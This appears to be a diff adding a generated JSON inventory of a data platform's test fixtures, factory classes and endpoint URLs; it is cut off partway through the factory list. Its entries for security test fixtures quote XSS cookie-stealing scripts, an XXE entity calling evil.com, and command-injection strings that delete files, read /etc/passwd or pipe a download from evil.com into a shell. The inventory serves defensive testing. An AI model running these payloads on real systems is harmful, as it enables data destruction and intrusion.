@@ -1,0 +1,1902 @@
+{
+  "generated_at": "2026-10-15T16:40:51.560024",
+  "summary": {
+    "total_fixture_files": 133,
+    "total_factory_classes": 53,
+    "total_endpoint_urls": 59,
+    "fixture_files_by_type": {
+      "json": 71,
+      "python": 1,
+      "conftest": 61
+    },
+    "factories_by_file": 9
+  },
+  "fixture_files": [
+    {
+      "path": "tests/fixtures/marketplace/sample_listing_ids.json",
+      "type": "json",
+      "size": 530,
+      "endpoints": []
+    },
+    {
+      "path": "tests/fixtures/databricks/job_run_state_matrix.json",
+      "type": "json",
+      "size": 3855,
+      "endpoints": []
+    },
+    {
+      "path": "tests/fixtures/databricks/estate.json",
+      "type": "json",
+      "size": 2386,
+      "endpoints": []
+    },
+    {
+      "path": "tests/fixtures/databricks/effective_permissions.json",
+      "type": "json",
+      "size": 192,
+      "endpoints": []
+    },
+    {
+      "path": "tests/fixtures/databricks/job_run_state_machine.json",
+      "type": "json",
+      "size": 638,
+      "endpoints": []
+    },
+    {
+      "path": "tests/fixtures/databricks/sql_warehouse_state_matrix.json",
+      "type": "json",
+      "size": 957,
+      "endpoints": []
+    },
+    {
+      "path": "tests/fixtures/databricks/sql_warehouses_estate.json",
+      "type": "json",
+      "size": 524,
+      "endpoints": []
+    },
+    {
+      "path": "tests/fixtures/databricks/sql_warehouse_roundtrip.json",
+      "type": "json",
+      "size": 1765,
+      "endpoints": []
+    },
+    {
+      "path": "tests/fixtures/databricks/estate_multi_page.json",
+      "type": "json",
+      "size": 3930,
+      "endpoints": []
+    },
+    {
+      "path": "tests/fixtures/marketplace/ckan/datasets/minimal_dataset.json",
+      "type": "json",
+      "size": 304,
+      "endpoints": []
+    },
+    {
+      "path": "tests/fixtures/marketplace/ckan/datasets/sample_dataset.json",
+      "type": "json",
+      "size": 1037,
+      "endpoints": []
+    },
+    {
+      "path": "tests/fixtures/marketplace/ckan/datasets/multilingual_dataset.json",
+      "type": "json",
+      "size": 795,
+      "endpoints": []
+    },
+    {
+      "path": "tests/fixtures/marketplace/ckan/datasets/dataset_with_odcs_metadata.json",
+      "type": "json",
+      "size": 937,
+      "endpoints": []
+    },
+    {
+      "path": "tests/fixtures/marketplace/ckan/datasets/dataset_with_odps_metadata.json",
+      "type": "json",
+      "size": 972,
+      "endpoints": [
+        "{\"pricing_plans\": [{\"planID\": \"plan-1\", \"name\": \"Basic Plan\", \"price\": 0, \"currency\": \"USD\"}], \"access_methods\": {\"api\": {\"endpoint\": \"https://api.example.com/data\"}}, \"payment_gateways\": {\"stripe\": {\"enabled\": true}}}"
+      ]
+    },
+    {
+      "path": "tests/fixtures/marketplace/ckan/api_responses/package_delete.json",
+      "type": "json",
+      "size": 129,
+      "endpoints": []
+    },
+    {
+      "path": "tests/fixtures/marketplace/ckan/api_responses/error_not_found.json",
+      "type": "json",
+      "size": 102,
+      "endpoints": []
+    },
+    {
+      "path": "tests/fixtures/marketplace/ckan/api_responses/status_show.json",
+      "type": "json",
+      "size": 269,
+      "endpoints": [
+        "https://data.example.com"
+      ]
+    },
+    {
+      "path": "tests/fixtures/marketplace/ckan/api_responses/error_validation.json",
+      "type": "json",
+      "size": 235,
+      "endpoints": []
+    },
+    {
+      "path": "tests/fixtures/marketplace/ckan/api_responses/package_show.json",
+      "type": "json",
+      "size": 3113,
+      "endpoints": [
+        "https://example.com/org-logo.png",
+        "https://example.com/data/sample.csv",
+        "https://example.com/data/sample.json"
+      ]
+    },
+    {
+      "path": "tests/fixtures/marketplace/ckan/api_responses/resource_show.json",
+      "type": "json",
+      "size": 609,
+      "endpoints": [
+        "https://example.com/data/sample.csv"
+      ]
+    },
+    {
+      "path": "tests/fixtures/marketplace/ckan/api_responses/package_create.json",
+      "type": "json",
+      "size": 653,
+      "endpoints": []
+    },
+    {
+      "path": "tests/fixtures/marketplace/ckan/api_responses/package_update.json",
+      "type": "json",
+      "size": 822,
+      "endpoints": []
+    },
+    {
+      "path": "tests/fixtures/marketplace/ckan/api_responses/error_permission.json",
+      "type": "json",
+      "size": 157,
+      "endpoints": []
+    },
+    {
+      "path": "tests/fixtures/marketplace/ckan/api_responses/package_list.json",
+      "type": "json",
+      "size": 166,
+      "endpoints": []
+    },
+    {
+      "path": "tests/fixtures/marketplace/ckan/api_responses/package_search.json",
+      "type": "json",
+      "size": 2287,
+      "endpoints": [
+        "https://example.com/data.csv"
+      ]
+    },
+    {
+      "path": "tests/fixtures/marketplace/ckan/resources/sample_api_resource.json",
+      "type": "json",
+      "size": 516,
+      "endpoints": [
+        "https://api.example.com/data"
+      ]
+    },
+    {
+      "path": "tests/fixtures/marketplace/ckan/resources/sample_json_resource.json",
+      "type": "json",
+      "size": 553,
+      "endpoints": [
+        "https://example.com/data/sample.json"
+      ]
+    },
+    {
+      "path": "tests/fixtures/marketplace/ckan/resources/minimal_resource.json",
+      "type": "json",
+      "size": 342,
+      "endpoints": [
+        "https://example.com/resource"
+      ]
+    },
+    {
+      "path": "tests/fixtures/marketplace/ckan/resources/sample_csv_resource.json",
+      "type": "json",
+      "size": 540,
+      "endpoints": [
+        "https://example.com/data/sample.csv"
+      ]
+    },
+    {
+      "path": "tests/fixtures/odps/v4.1/marketplace/sample-payment-gateways-v4.1.json",
+      "type": "json",
+      "size": 3186,
+      "endpoints": [
+        "https://opendataproducts.org/schema/v4.1"
+      ]
+    },
+    {
+      "path": "tests/fixtures/odps/v4.1/marketplace/sample-complete-marketplace-v4.1.json",
+      "type": "json",
+      "size": 1343,
+      "endpoints": [
+        "https://opendataproducts.org/schema/v4.1",
+        "https://api.example.com/v1/products/complete-marketplace-product",
+        "https://download.example.com/products/complete-marketplace-product"
+      ]
+    },
+    {
+      "path": "tests/fixtures/odps/v4.1/marketplace/sample-access-methods-v4.1.json",
+      "type": "json",
+      "size": 3017,
+      "endpoints": [
+        "https://opendataproducts.org/schema/v4.1",
+        "https://api.example.com/v1/products/marketplace-access-product",
+        "https://docs.example.com/api/v1",
+        "https://download.example.com/products/marketplace-access-product",
+        "https://webhook.example.com/v1/products/marketplace-access-product"
+      ]
+    },
+    {
+      "path": "tests/fixtures/odps/v4.1/marketplace/sample-pricing-plans-v4.1.json",
+      "type": "json",
+      "size": 3035,
+      "endpoints": [
+        "https://opendataproducts.org/schema/v4.1"
+      ]
+    },
+    {
+      "path": "tests/fixtures/odps/v4.1/with_refs/sample-external-ref-v4.1.json",
+      "type": "json",
+      "size": 923,
+      "endpoints": [
+        "https://opendataproducts.org/schema/v4.1",
+        "https://example.com/contracts/sample-product-external-ref-v4.1",
+        "https://example.com/schema.yaml#/accessMethods"
+      ]
+    },
+    {
+      "path": "tests/fixtures/odps/v4.1/with_refs/sample-internal-ref-v4.1.json",
+      "type": "json",
+      "size": 1269,
+      "endpoints": [
+        "https://opendataproducts.org/schema/v4.1",
+        "https://example.com/contracts/sample-product-internal-ref-v4.1"
+      ]
+    },
+    {
+      "path": "tests/fixtures/odps/v4.1/with_refs/sample-mixed-refs-v4.1.json",
+      "type": "json",
+      "size": 953,
+      "endpoints": [
+        "https://opendataproducts.org/schema/v4.1",
+        "https://example.com/contracts/sample-product-mixed-refs-v4.1",
+        "https://example.com/schema.yaml#/accessMethods"
+      ]
+    },
+    {
+      "path": "tests/fixtures/odps/v4.1/with_refs/sample-local-ref-v4.1.json",
+      "type": "json",
+      "size": 796,
+      "endpoints": [
+        "https://opendataproducts.org/schema/v4.1",
+        "https://example.com/contracts/sample-product-local-ref-v4.1"
+      ]
+    },
+    {
+      "path": "tests/fixtures/odps/v4.1/multilingual/sample-multiple-languages-v4.1.json",
+      "type": "json",
+      "size": 1763,
+      "endpoints": [
+        "https://opendataproducts.org/schema/v4.1",
+        "https://example.com/contracts/multilingual-product-multi",
+        "https://api.example.com/v1/products/multilingual-product-multi"
+      ]
+    },
+    {
+      "path": "tests/fixtures/odps/v4.1/multilingual/sample-french-only-v4.1.json",
+      "type": "json",
+      "size": 674,
+      "endpoints": [
+        "https://opendataproducts.org/schema/v4.1",
+        "https://example.com/contracts/multilingual-product-fr"
+      ]
+    },
+    {
+      "path": "tests/fixtures/odps/v4.1/multilingual/sample-english-only-v4.1.json",
+      "type": "json",
+      "size": 638,
+      "endpoints": [
+        "https://opendataproducts.org/schema/v4.1",
+        "https://example.com/contracts/multilingual-product-en"
+      ]
+    },
+    {
+      "path": "tests/fixtures/odps/v4.1/invalid/invalid-wrong-data-type-schema-v4.1.json",
+      "type": "json",
+      "size": 287,
+      "endpoints": []
+    },
+    {
+      "path": "tests/fixtures/odps/v4.1/invalid/invalid-schema-violation-v4.1.json",
+      "type": "json",
+      "size": 328,
+      "endpoints": [
+        "https://opendataproducts.org/schema/v3.9"
+      ]
+    },
+    {
+      "path": "tests/fixtures/odps/v4.1/invalid/invalid-wrong-data-type-details-v4.1.json",
+      "type": "json",
+      "size": 184,
+      "endpoints": [
+        "https://opendataproducts.org/schema/v4.1"
+      ]
+    },
+    {
+      "path": "tests/fixtures/odps/v4.1/invalid/invalid-missing-required-field-v4.1.json",
+      "type": "json",
+      "size": 265,
+      "endpoints": []
+    },
+    {
+      "path": "tests/fixtures/odps/v4.1/invalid/invalid-missing-product-v4.1.json",
+      "type": "json",
+      "size": 164,
+      "endpoints": [
+        "https://opendataproducts.org/schema/v4.1"
+      ]
+    },
+    {
+      "path": "tests/fixtures/odps/v4.1/invalid/invalid-wrong-data-type-product-v4.1.json",
+      "type": "json",
+      "size": 135,
+      "endpoints": [
+        "https://opendataproducts.org/schema/v4.1"
+      ]
+    },
+    {
+      "path": "tests/fixtures/odps/v4.1/invalid/invalid-version-pattern-v4.1.json",
+      "type": "json",
+      "size": 346,
+      "endpoints": [
+        "https://opendataproducts.org/schema/v4.1"
+      ]
+    },
+    {
+      "path": "tests/fixtures/odps/v4.1/invalid/invalid-schema-pattern-v4.1.json",
+      "type": "json",
+      "size": 335,
+      "endpoints": [
+        "https://invalid-schema-url.com/schema/v4.1"
+      ]
+    },
+    {
+      "path": "tests/fixtures/odps/v4.1/valid/sample-valid-v4.1.json",
+      "type": "json",
+      "size": 1712,
+      "endpoints": [
+        "https://opendataproducts.org/schema/v4.1",
+        "https://example.com/contracts/sample-product-v4.1",
+        "https://api.example.com/v1/products/sample-product-v4.1",
+        "https://download.example.com/products/sample-product-v4.1"
+      ]
+    },
+    {
+      "path": "tests/fixtures/odps/v2.x/with_refs/sample-internal-ref-v2.9.json",
+      "type": "json",
+      "size": 553,
+      "endpoints": [
+        "https://opendataproducts.org/schema/v2.9",
+        "https://example.com/contracts/sample-product-internal-ref-v2.9"
+      ]
+    },
+    {
+      "path": "tests/fixtures/odps/v2.x/with_refs/sample-external-ref-v2.9.json",
+      "type": "json",
+      "size": 439,
+      "endpoints": [
+        "https://opendataproducts.org/schema/v2.9",
+        "https://example.com/schema.yaml#/contract"
+      ]
+    },
+    {
+      "path": "tests/fixtures/odps/v2.x/with_refs/sample-local-ref-v2.9.json",
+      "type": "json",
+      "size": 415,
+      "endpoints": [
+        "https://opendataproducts.org/schema/v2.9"
+      ]
+    },
+    {
+      "path": "tests/fixtures/odps/v2.x/valid/sample-valid-v2.9.json",
+      "type": "json",
+      "size": 792,
+      "endpoints": [
+        "https://opendataproducts.org/schema/v2.9",
+        "https://example.com/contracts/sample-product-v2.9"
+      ]
+    },
+    {
+      "path": "tests/fixtures/odps/v3.x/with_refs/sample-external-ref-v3.9.json",
+      "type": "json",
+      "size": 813,
+      "endpoints": [
+        "https://opendataproducts.org/schema/v3.9",
+        "https://example.com/contracts/sample-product-external-ref-v3.9",
+        "https://example.com/schema.yaml#/accessMethods"
+      ]
+    },
+    {
+      "path": "tests/fixtures/odps/v3.x/with_refs/sample-internal-ref-v3.9.json",
+      "type": "json",
+      "size": 806,
+      "endpoints": [
+        "https://opendataproducts.org/schema/v3.9",
+        "https://example.com/contracts/sample-product-internal-ref-v3.9"
+      ]
+    },
+    {
+      "path": "tests/fixtures/odps/v3.x/with_refs/sample-local-ref-v3.9.json",
+      "type": "json",
+      "size": 714,
+      "endpoints": [
+        "https://opendataproducts.org/schema/v3.9",
+        "https://example.com/contracts/sample-product-local-ref-v3.9"
+      ]
+    },
+    {
+      "path": "tests/fixtures/odps/v3.x/valid/sample-valid-v3.9.json",
+      "type": "json",
+      "size": 832,
+      "endpoints": [
+        "https://opendataproducts.org/schema/v3.9",
+        "https://example.com/contracts/sample-product-v3.9"
+      ]
+    },
+    {
+      "path": "tests/fixtures/odps/v4.0/with_refs/sample-internal-ref-v4.0.json",
+      "type": "json",
+      "size": 841,
+      "endpoints": [
+        "https://opendataproducts.org/schema/v4.0",
+        "https://example.com/contracts/sample-product-internal-ref-v4.0"
+      ]
+    },
+    {
+      "path": "tests/fixtures/odps/v4.0/with_refs/sample-external-ref-v4.0.json",
+      "type": "json",
+      "size": 848,
+      "endpoints": [
+        "https://opendataproducts.org/schema/v4.0",
+        "https://example.com/contracts/sample-product-external-ref-v4.0",
+        "https://example.com/schema.yaml#/accessMethods"
+      ]
+    },
+    {
+      "path": "tests/fixtures/odps/v4.0/with_refs/sample-local-ref-v4.0.json",
+      "type": "json",
+      "size": 721,
+      "endpoints": [
+        "https://opendataproducts.org/schema/v4.0",
+        "https://example.com/contracts/sample-product-local-ref-v4.0"
+      ]
+    },
+    {
+      "path": "tests/fixtures/odps/v4.0/valid/sample-valid-v4.0.json",
+      "type": "json",
+      "size": 1008,
+      "endpoints": [
+        "https://opendataproducts.org/schema/v4.0",
+        "https://example.com/contracts/sample-product-v4.0",
+        "https://api.example.com/v1/products/sample-product-v4.0"
+      ]
+    },
+    {
+      "path": "tests/fixtures/odps/security/malicious/path-traversal-attempt.json",
+      "type": "json",
+      "size": 565,
+      "endpoints": [
+        "https://opendataproducts.org/schema/v4.1"
+      ]
+    },
+    {
+      "path": "tests/fixtures/odps/security/malicious/script-injection-attempt.json",
+      "type": "json",
+      "size": 1187,
+      "endpoints": [
+        "https://opendataproducts.org/schema/v4.1",
+        "https://example.com/contract?param=<script>alert(document.cookie)</script>",
+        "https://api.example.com/v1?callback=<script>eval('alert(1)')</script>"
+      ]
+    },
+    {
+      "path": "tests/fixtures/odps/security/malicious/path-traversal-multiple.json",
+      "type": "json",
+      "size": 805,
+      "endpoints": [
+        "https://opendataproducts.org/schema/v4.1"
+      ]
+    },
+    {
+      "path": "tests/fixtures/odps/security/malicious/malicious-url-javascript.json",
+      "type": "json",
+      "size": 815,
+      "endpoints": [
+        "https://opendataproducts.org/schema/v4.1"
+      ]
+    },
+    {
+      "path": "tests/fixtures/odps/security/malicious/xxe-attempt.json",
+      "type": "json",
+      "size": 906,
+      "endpoints": [
+        "https://opendataproducts.org/schema/v4.1",
+        "<!DOCTYPE foo [<!ENTITY xxe SYSTEM \"http://evil.com/steal\">]><foo>&xxe;</foo>"
+      ]
+    },
+    {
+      "path": "tests/fixtures/odps/security/malicious/command-injection-attempt.json",
+      "type": "json",
+      "size": 947,
+      "endpoints": [
+        "https://opendataproducts.org/schema/v4.1",
+        "https://example.com/contract; rm -rf /",
+        "https://api.example.com/v1?param=$(cat /etc/passwd)",
+        "https://download.example.com/file; wget http://evil.com/steal.sh | sh"
+      ]
+    },
+    {
+      "path": "tests/fixtures/odps/v1.x/with_refs/sample-local-ref-v1.9.json",
+      "type": "json",
+      "size": 415,
+      "endpoints": [
+        "https://opendataproducts.org/schema/v1.9"
+      ]
+    },
+    {
+      "path": "tests/fixtures/odps/v1.x/with_refs/sample-internal-ref-v1.9.json",
+      "type": "json",
+      "size": 553,
+      "endpoints": [
+        "https://opendataproducts.org/schema/v1.9",
+        "https://example.com/contracts/sample-product-internal-ref-v1.9"
+      ]
+    },
+    {
+      "path": "tests/fixtures/odps/v1.x/with_refs/sample-external-ref-v1.9.json",
+      "type": "json",
+      "size": 439,
+      "endpoints": [
+        "https://opendataproducts.org/schema/v1.9",
+        "https://example.com/schema.yaml#/contract"
+      ]
+    },
+    {
+      "path": "tests/fixtures/odps/v1.x/valid/sample-valid-v1.9.json",
+      "type": "json",
+      "size": 585,
+      "endpoints": [
+        "https://opendataproducts.org/schema/v1.9",
+        "https://example.com/contracts/sample-product-v1.9"
+      ]
+    },
+    {
+      "path": "hub/apps/orchestration/tests/fixtures.py",
+      "type": "python",
+      "size": 2455,
+      "endpoints": []
+    },
+    {
+      "path": "tests/conftest.py",
+      "type": "conftest",
+      "size": 127694,
+      "endpoints": [
+        "localhost:8083",
+        "localhost:8081",
+        "localhost:8082",
+        "localhost:8080"
+      ]
+    },
+    {
+      "path": "hub/tests/conftest.py",
+      "type": "conftest",
+      "size": 952,
+      "endpoints": []
+    },
+    {
+      "path": "hub/data_movement/tests/conftest.py",
+      "type": "conftest",
+      "size": 4235,
+      "endpoints": []
+    },
+    {
+      "path": "hub/apps/webhooks/tests/conftest.py",
+      "type": "conftest",
+      "size": 1181,
+      "endpoints": []
+    },
+    {
+      "path": "hub/apps/datasets/tests/conftest.py",
+      "type": "conftest",
+      "size": 4756,
+      "endpoints": []
+    },
+    {
+      "path": "hub/apps/graphql_graphene/tests/conftest.py",
+      "type": "conftest",
+      "size": 8028,
+      "endpoints": []
+    },
+    {
+      "path": "hub/apps/marketplace/tests/conftest.py",
+      "type": "conftest",
+      "size": 1066,
+      "endpoints": []
+    },
+    {
+      "path": "hub/apps/contracts/tests/conftest.py",
+      "type": "conftest",
+      "size": 680,
+      "endpoints": []
+    },
+    {
+      "path": "hub/apps/contracts/tests/security/conftest.py",
+      "type": "conftest",
+      "size": 1053,
+      "endpoints": []
+    },
+    {
+      "path": "hub/apps/files/tests/conftest.py",
+      "type": "conftest",
+      "size": 543,
+      "endpoints": []
+    },
+    {
+      "path": "hub/apps/orchestration/tests/conftest.py",
+      "type": "conftest",
+      "size": 2173,
+      "endpoints": []
+    },
+    {
+      "path": "hub/apps/orchestration/workflows/tests/conftest.py",
+      "type": "conftest",
+      "size": 668,
+      "endpoints": []
+    },
+    {
+      "path": "hub/apps/auth/tests/conftest.py",
+      "type": "conftest",
+      "size": 542,
+      "endpoints": []
+    },
+    {
+      "path": "hub/apps/ml/tests/conftest.py",
+      "type": "conftest",
+      "size": 12215,
+      "endpoints": []
+    },
+    {
+      "path": "hub/apps/assets/tests/conftest.py",
+      "type": "conftest",
+      "size": 544,
+      "endpoints": []
+    },
+    {
+      "path": "hub/apps/compliance/tests/conftest.py",
+      "type": "conftest",
+      "size": 548,
+      "endpoints": []
+    },
+    {
+      "path": "hub/apps/integrations/tests/conftest.py",
+      "type": "conftest",
+      "size": 16940,
+      "endpoints": []
+    },
+    {
+      "path": "hub/apps/warehouses/tests/conftest.py",
+      "type": "conftest",
+      "size": 1076,
+      "endpoints": []
+    },
+    {
+      "path": "hub/apps/ai/tests/conftest.py",
+      "type": "conftest",
+      "size": 221,
+      "endpoints": []
+    },
+    {
+      "path": "hub/apps/governance/tests/conftest.py",
+      "type": "conftest",
+      "size": 548,
+      "endpoints": []
+    },
+    {
+      "path": "hub/apps/dq/tests/conftest.py",
+      "type": "conftest",
+      "size": 540,
+      "endpoints": []
+    },
+    {
+      "path": "hub/apps/databricks_admin/tests/conftest.py",
+      "type": "conftest",
+      "size": 1962,
+      "endpoints": []
+    },
+    {
+      "path": "hub/apps/semantic/tests/conftest.py",
+      "type": "conftest",
+      "size": 2926,
+      "endpoints": []
+    },
+    {
+      "path": "services/shared/tests/conftest.py",
+      "type": "conftest",
+      "size": 2384,
+      "endpoints": []
+    },
+    {
+      "path": "services/datacontract-service/tests/conftest.py",
+      "type": "conftest",
+      "size": 520,
+      "endpoints": []
+    },
+    {
+      "path": "services/prefect-integration/tests/conftest.py",
+      "type": "conftest",
+      "size": 16588,
+      "endpoints": []
+    },
+    {
+      "path": "services/compliance-service/tests/conftest.py",
+      "type": "conftest",
+      "size": 4107,
+      "endpoints": []
+    },
+    {
+      "path": "services/worker/tests/conftest.py",
+      "type": "conftest",
+      "size": 3321,
+      "endpoints": []
+    },
+    {
+      "path": "services/dq-service/tests/conftest.py",
+      "type": "conftest",
+      "size": 3566,
+      "endpoints": []
+    },
+    {
+      "path": "services/semantic-service/tests/conftest.py",
+      "type": "conftest",
+      "size": 1860,
+      "endpoints": [
+        "localhost:8086",
+        "localhost:8081",
+        "localhost:3031"
+      ]
+    },
+    {
+      "path": "services/odh-integration/tests/conftest.py",
+      "type": "conftest",
+      "size": 4686,
+      "endpoints": [
+        "localhost:8083",
+        "localhost:8081",
+        "localhost:8082",
+        "localhost:8080"
+      ]
+    },
+    {
+      "path": "cli/tests/conftest.py",
+      "type": "conftest",
+      "size": 6812,
+      "endpoints": []
+    },
+    {
+      "path": "cli/tests/integration/conftest.py",
+      "type": "conftest",
+      "size": 5585,
+      "endpoints": []
+    },
+    {
+      "path": "cli/tests/e2e/conftest.py",
+      "type": "conftest",
+      "size": 1111,
+      "endpoints": []
+    },
+    {
+      "path": "cli/tests/security/conftest.py",
+      "type": "conftest",
+      "size": 1107,
+      "endpoints": []
+    },
+    {
+      "path": "cli/tests/dimensions/conftest.py",
+      "type": "conftest",
+      "size": 792,
+      "endpoints": []
+    },
+    {
+      "path": "cli/tests/use_cases/conftest.py",
+      "type": "conftest",
+      "size": 14941,
+      "endpoints": []
+    },
+    {
+      "path": "tests/performance/conftest.py",
+      "type": "conftest",
+      "size": 3577,
+      "endpoints": []
+    },
+    {
+      "path": "tests/prefect/conftest.py",
+      "type": "conftest",
+      "size": 3144,
+      "endpoints": [
+        "localhost:4200",
+        "http://localhost:4200/api"
+      ]
+    },
+    {
+      "path": "tests/integration/conftest.py",
+      "type": "conftest",
+      "size": 2098,
+      "endpoints": []
+    },
+    {
+      "path": "tests/e2e/conftest.py",
+      "type": "conftest",
+      "size": 90331,
+      "endpoints": [
+        "/api/v1/assets/{asset_id}/activate/",
+        "/api/v1/files/init/",
+        "/api/v1/auth/login/,",
+        "/api/v1/contracts/{contract_id}/validate/",
+        "/api/v1/contracts/",
+        "/api/v1/compliance/runs/",
+        "/api/v1/dq/runs/",
+        "/api/v1/datasets/",
+        "localhost:8000",
+        "/api/v1/assets/{asset_id}/contracts/",
+        "/api/v1/files/{file_id}/complete/"
+      ]
+    },
+    {
+      "path": "tests/pact/conftest.py",
+      "type": "conftest",
+      "size": 359,
+      "endpoints": []
+    },
+    {
+      "path": "tests/concurrency/conftest.py",
+      "type": "conftest",
+      "size": 768,
+      "endpoints": []
+    },
+    {
+      "path": "tests/security/conftest.py",
+      "type": "conftest",
+      "size": 1811,
+      "endpoints": []
+    },
+    {
+      "path": "tests/sdk_python/conftest.py",
+      "type": "conftest",
+      "size": 18729,
+      "endpoints": [
+        "/api/v1/auth/login/",
+        "localhost:8000"
+      ]
+    },
+    {
+      "path": "tests/schema/conftest.py",
+      "type": "conftest",
+      "size": 2020,
+      "endpoints": []
+    },
+    {
+      "path": "tests/scripts/conftest.py",
+      "type": "conftest",
+      "size": 232,
+      "endpoints": []
+    },
+    {
+      "path": "tests/smoke/conftest.py",
+      "type": "conftest",
+      "size": 4431,
+      "endpoints": [
+        "/api/v1/auth/login/",
+        "localhost:8001"
+      ]
+    },
+    {
+      "path": "tests/resilience/conftest.py",
+      "type": "conftest",
+      "size": 438,
+      "endpoints": []
+    },
+    {
+      "path": "tests/isolation/conftest.py",
+      "type": "conftest",
+      "size": 3043,
+      "endpoints": []
+    },
+    {
+      "path": "tests/integration/databricks_e2e/conftest.py",
+      "type": "conftest",
+      "size": 2219,
+      "endpoints": []
+    },
+    {
+      "path": "tests/e2e/_guards/conftest.py",
+      "type": "conftest",
+      "size": 302,
+      "endpoints": []
+    },
+    {
+      "path": "sdk/python/tests/conftest.py",
+      "type": "conftest",
+      "size": 19048,
+      "endpoints": [
+        "/api/v1/tenants/{id}/",
+        "/api/v1/auth/me/",
+        "/api/v1/health/",
+        "/api/v1/tenants/{tenant_id}/",
+        "/api/v1/auth/refresh/",
+        "/api/v1/auth/login/"
+      ]
+    },
+    {
+      "path": "sdk/python/tests/security/conftest.py",
+      "type": "conftest",
+      "size": 1875,
+      "endpoints": []
+    },
+    {
+      "path": "sdk/python/tests/dimensions/conftest.py",
+      "type": "conftest",
+      "size": 1534,
+      "endpoints": []
+    },
+    {
+      "path": "sdk/python/tests/use_cases/conftest.py",
+      "type": "conftest",
+      "size": 5600,
+      "endpoints": [
+        "/api/v1/auth/me/"
+      ]
+    },
+    {
+      "path": "sdk/python/build/lib/tests/conftest.py",
+      "type": "conftest",
+      "size": 19048,
+      "endpoints": [
+        "/api/v1/tenants/{id}/",
+        "/api/v1/auth/me/",
+        "/api/v1/health/",
+        "/api/v1/tenants/{tenant_id}/",
+        "/api/v1/auth/refresh/",
+        "/api/v1/auth/login/"
+      ]
+    },
+    {
+      "path": "sdk/python/build/lib/tests/security/conftest.py",
+      "type": "conftest",
+      "size": 1875,
+      "endpoints": []
+    },
+    {
+      "path": "sdk/python/build/lib/tests/dimensions/conftest.py",
+      "type": "conftest",
+      "size": 1534,
+      "endpoints": []
+    },
+    {
+      "path": "sdk/python/build/lib/tests/use_cases/conftest.py",
+      "type": "conftest",
+      "size": 5600,
+      "endpoints": [
+        "/api/v1/auth/me/"
+      ]
+    },
+    {
+      "path": "infrastructure/staging/config-artifacts/services/prefect-integration/tests/conftest.py",
+      "type": "conftest",
+      "size": 16588,
+      "endpoints": []
+    }
+  ],
+  "factory_classes": [
+    {
+      "file_path": "tests/factories_boy.py",
+      "class_name": "TenantFactory",
+      "line_number": 26,
+      "methods": [],
+      "method_count": 0
+    },
+    {
+      "file_path": "tests/factories_boy.py",
+      "class_name": "TenantConfigFactory",
+      "line_number": 40,
+      "methods": [],
+      "method_count": 0
+    },
+    {
+      "file_path": "tests/factories_boy.py",
+      "class_name": "UserFactory",
+      "line_number": 64,
+      "methods": [],
+      "method_count": 0
+    },
+    {
+      "file_path": "tests/factories_boy.py",
+      "class_name": "EmailDeliveryFactory",
+      "line_number": 78,
+      "methods": [],
+      "method_count": 0
+    },
+    {
+      "file_path": "tests/factories_boy.py",
+      "class_name": "JobFactory",
+      "line_number": 93,
+      "methods": [],
+      "method_count": 0
+    },
+    {
+      "file_path": "tests/factories_boy.py",
+      "class_name": "ScheduledIngestionFactory",
+      "line_number": 114,
+      "methods": [],
+      "method_count": 0
+    },
+    {
+      "file_path": "tests/factories_boy.py",
+      "class_name": "ScheduledIngestionRunFactory",
+      "line_number": 128,
+      "methods": [],
+      "method_count": 0
+    },
+    {
+      "file_path": "tests/factories_boy.py",
+      "class_name": "SchemaVersionFactory",
+      "line_number": 141,
+      "methods": [],
+      "method_count": 0
+    },
+    {
+      "file_path": "tests/factories_boy.py",
+      "class_name": "DataClassificationFactory",
+      "line_number": 161,
+      "methods": [],
+      "method_count": 0
+    },
+    {
+      "file_path": "tests/factories_boy.py",
+      "class_name": "RetentionPolicyFactory",
+      "line_number": 173,
+      "methods": [],
+      "method_count": 0
+    },
+    {
+      "file_path": "tests/factories_boy.py",
+      "class_name": "AccessRequestFactory",
+      "line_number": 185,
+      "methods": [],
+      "method_count": 0
+    },
+    {
+      "file_path": "tests/factories_boy.py",
+      "class_name": "DatasetSnapshotFactory",
+      "line_number": 198,
+      "methods": [],
+      "method_count": 0
+    },
+    {
+      "file_path": "tests/factories_boy.py",
+      "class_name": "SearchIndexFactory",
+      "line_number": 210,
+      "methods": [],
+      "method_count": 0
+    },
+    {
+      "file_path": "tests/factories_boy.py",
+      "class_name": "SearchAnalyticsFactory",
+      "line_number": 222,
+      "methods": [],
+      "method_count": 0
+    },
+    {
+      "file_path": "tests/factories_boy.py",
+      "class_name": "WebhookFactory",
+      "line_number": 234,
+      "methods": [],
+      "method_count": 0
+    },
+    {
+      "file_path": "tests/factories_boy.py",
+      "class_name": "WebhookDeliveryFactory",
+      "line_number": 247,
+      "methods": [],
+      "method_count": 0
+    },
+    {
+      "file_path": "tests/factories_boy.py",
+      "class_name": "DataObservabilityMetricFactory",
+      "line_number": 260,
+      "methods": [],
+      "method_count": 0
+    },
+    {
+      "file_path": "tests/factories_boy.py",
+      "class_name": "DataIncidentFactory",
+      "line_number": 273,
+      "methods": [],
+      "method_count": 0
+    },
+    {
+      "file_path": "tests/factories_boy.py",
+      "class_name": "AccessPolicyFactory",
+      "line_number": 287,
+      "methods": [],
+      "method_count": 0
+    },
+    {
+      "file_path": "tests/factories_boy.py",
+      "class_name": "FieldAccessPolicyFactory",
+      "line_number": 299,
+      "methods": [],
+      "method_count": 0
+    },
+    {
+      "file_path": "tests/factories_boy.py",
+      "class_name": "AccessLogFactory",
+      "line_number": 311,
+      "methods": [],
+      "method_count": 0
+    },
+    {
+      "file_path": "tests/factories_boy.py",
+      "class_name": "AccessCertificationFactory",
+      "line_number": 324,
+      "methods": [],
+      "method_count": 0
+    },
+    {
+      "file_path": "tests/factories_boy.py",
+      "class_name": "DQAnomalyFactory",
+      "line_number": 337,
+      "methods": [],
+      "method_count": 0
+    },
+    {
+      "file_path": "tests/factories_boy.py",
+      "class_name": "DQTrendFactory",
+      "line_number": 350,
+      "methods": [],
+      "method_count": 0
+    },
+    {
+      "file_path": "tests/factories_boy.py",
+      "class_name": "DQAlertingRuleFactory",
+      "line_number": 363,
+      "methods": [],
+      "method_count": 0
+    },
+    {
+      "file_path": "tests/factories_boy.py",
+      "class_name": "IngestionTemplateFactory",
+      "line_number": 376,
+      "methods": [],
+      "method_count": 0
+    },
+    {
+      "file_path": "tests/factories_boy.py",
+      "class_name": "DatasetFactoryEnhanced",
+      "line_number": 394,
+      "methods": [],
+      "method_count": 0
+    },
+    {
+      "file_path": "tests/factories_boy.py",
+      "class_name": "AssetFactoryEnhanced",
+      "line_number": 415,
+      "methods": [],
+      "method_count": 0
+    },
+    {
+      "file_path": "tests/factories_boy.py",
+      "class_name": "ContractFactoryEnhanced",
